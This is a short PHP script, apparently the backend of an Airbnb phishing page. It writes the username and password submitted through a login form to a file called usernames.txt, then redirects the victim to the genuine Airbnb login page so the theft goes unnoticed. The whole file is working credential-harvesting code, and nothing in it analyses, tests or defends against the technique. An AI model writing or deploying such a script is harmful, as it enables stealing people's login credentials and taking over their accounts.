<?php

file_put_contents("usernames.txt", "Airbnb Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.airbnb.co.in/login');
exit();
?>
     